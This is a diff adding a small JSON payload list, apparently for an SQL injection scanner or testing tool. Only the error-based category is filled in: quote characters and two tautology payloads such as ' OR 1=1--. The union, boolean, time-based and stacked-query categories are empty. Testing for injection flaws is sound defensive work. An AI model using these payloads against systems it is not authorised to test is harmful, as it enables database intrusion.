@@ -1,0 +1,12 @@
+{
+  "error_based": [
+    {"payload": "'", "description": "Single quote", "risk_level": "HIGH"},
+    {"payload": "\"", "description": "Double quote", "risk_level": "HIGH"},
+    {"payload": "' OR '1'='1", "description": "Tautology", "risk_level": "CRITICAL"},
+    {"payload": "' OR 1=1--", "description": "Tautology with comment", "risk_level": "CRITICAL"}
+  ],
+  "union_based": [],
+  "boolean_based": [],
+  "time_based": [],
+  "stacked_queries": []
+}
